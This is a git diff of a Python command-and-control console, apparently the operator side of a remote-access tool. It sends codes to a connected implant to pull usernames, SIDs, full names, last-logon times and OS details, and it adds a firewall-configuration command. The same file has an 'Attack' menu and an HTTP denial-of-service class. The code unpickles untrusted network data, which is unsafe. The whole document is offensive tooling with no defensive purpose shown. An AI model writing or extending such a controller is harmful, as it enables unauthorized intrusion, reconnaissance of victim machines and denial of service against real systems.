@@ -3,6 +3,7 @@ import socket, pickle, random, time, sys,netifaces
 serv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 #server_ip = netifaces.ifaddresses('eth0')[netifaces.AF_INET][0]['addr']  APPLY THIS ONLY TO LINUX
 
+ActualValue = ""
 
 def startconn():
     serv.bind(('127.0.0.1', 2023))                ###<<<<<< REPLACE 127.0.0.1 with server_ip
@@ -12,27 +13,36 @@ def startconn():
     conn, addr = serv.accept()
     return
 
-def connection():
+def connection(ActualValue):
     while True:
         from_client = ''
         print(ActualValue)
         conn.send(bytes(ActualValue, 'utf8'))
         data = conn.recv(99999)
-        if not data : break
-        data_variable = pickle.loads(data)
-        if ActualValue == 'C3':
-            listToStr = '\n'.join([str(elem) for elem in data_variable])
-            for excess in listToStr:
-                print(excess.name)
-        else:
-            listToStr = ''.join([str(elem) for elem in data_variable])
-            print(listToStr)
+        if not data: break
+        if ActualValue == "F1" or ActualValue == "F2":
+            print(data.decode('utf-8'))
             from_client += str(data)
+            main()
+        else:
+            data_variable = pickle.loads(data)
+            if ActualValue == 'C3':
+                index = 1
+                print("No", "|", "Name")
+                for excess in data_variable:
+                    print(index, "|", excess.name())
+                    index = index + 1
+                from_client += str(data)
+            else:
+                listToStr = ' '.join([str(elem) for elem in data_variable])
+                print(listToStr)
+                from_client += str(data)
+
+        print(2 * '\n')
         enumvalue()
 
 def enumvalue():
     value = ""
-    global ActualValue
     accepted_command = ["U", "O", "C", "M","F","E","B"]
     print("[U] User Enum \n"
           "[O] OS Enum \n"
@@ -45,9 +55,9 @@ def enumvalue():
     type = input("What is your category? \n")[0]
     if accepted_command[0] == type:
         print("1. Username \n"
-                "2. SID \n"
-                "3. User Full Name ** \n"
-                "4. Last log on \n")
+              "2. SID \n"
+              "3. User Full Name ** \n"
+              "4. Last log on \n")
         value = input("Which value you would like to extract? \n")
     elif accepted_command[1] == type:
         print("1. Machine Name \n"
@@ -75,7 +85,7 @@ def enumvalue():
         print("Invalid Command")
         enumvalue()
     ActualValue = type + value
-    connection()
+    connection(ActualValue)
     return
 
 def attackcommand():
@@ -93,8 +103,11 @@ def attackcommand():
         print("Connection Closed")
     else:
         print("Invalid Command")
-    connection()
     return
+
+def firewall():
+    ActualValue = "F2"
+    connection(ActualValue)
 
 class HTTPRequestDOS():
     def __init__(self, ip, port=80, socketsCount=200):
@@ -140,7 +153,8 @@ class HTTPRequestDOS():
 def main():
     print("What would you like to operate: \n"
           "1. Enumeration \n"
-          "2. Attack")
+          "2. Attack \n"
+          "3. Firewall Config")
 
     while True:
         try:
@@ -153,6 +167,8 @@ def main():
         enumvalue()
     elif main_input == 2:
         attackcommand()
+    elif main_input == 3:
+        firewall()
     else:
         print("Not an option")
 
